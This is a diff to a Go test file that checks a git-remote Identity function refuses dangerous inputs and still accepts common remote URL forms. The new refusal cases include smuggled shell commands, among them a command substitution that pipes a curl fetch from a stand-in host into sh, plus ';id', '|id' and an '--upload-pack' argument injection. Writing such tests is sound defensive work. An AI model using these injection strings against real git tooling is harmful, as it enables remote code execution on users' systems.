@@ -54,11 +54,47 @@ func TestIdentityRefusesControlBytesAndWhitespace(t *testing.T) {
 		"https://host/a%20b",
 		"ssh://git@host/dig/a%09b",
 		"git@ho st:dig/api",
+		"https://github.com/org/%E2%80%AEoper",
+		"host:dig/a\u200bb",
+		"host:dig/a\xffb",
 	} {
 		if id, err := Identity(in); err == nil {
 			t.Errorf("Identity(%q) = %q, want refusal", in, id)
 		} else if err != errNotRemote {
 			t.Errorf("Identity(%q) error %v, want the constant refusal", in, err)
+		}
+	}
+}
+
+func TestIdentityRefusesShellCharacters(t *testing.T) {
+	for _, in := range []string{
+		"$(curl${IFS}evil.sh|sh)@github.com:org/repo",
+		"`id`@github.com:org/repo",
+		"https://$(id)@github.com/org/repo",
+		"--upload-pack=x@github.com:org/repo",
+		"~me@github.com:org/repo",
+		"github.com:org/a;id",
+		"github.com:org/a|id",
+		"github.com:org/'a'",
+		"https://github.com/org/a%24(id)",
+	} {
+		if id, err := Identity(in); err == nil {
+			t.Errorf("Identity(%q) = %q, want refusal", in, id)
+		} else if strings.Contains(err.Error(), in) {
+			t.Errorf("Identity(%q) error echoes the input: %q", in, err)
+		}
+	}
+}
+
+func TestIdentityKeepsCommonRemoteForms(t *testing.T) {
+	for _, in := range []string{
+		"ssh://git@gitlab.com:2222/~me/api.git",
+		"https://oauth2:glpat-x_Y.z@gitlab.com/dig/api",
+		"git@github.com:org/my-repo_2.git",
+		"https://host/org/caf%C3%A9",
+	} {
+		if _, err := Identity(in); err != nil {
+			t.Errorf("Identity(%q): %v", in, err)
 		}
 	}
 }
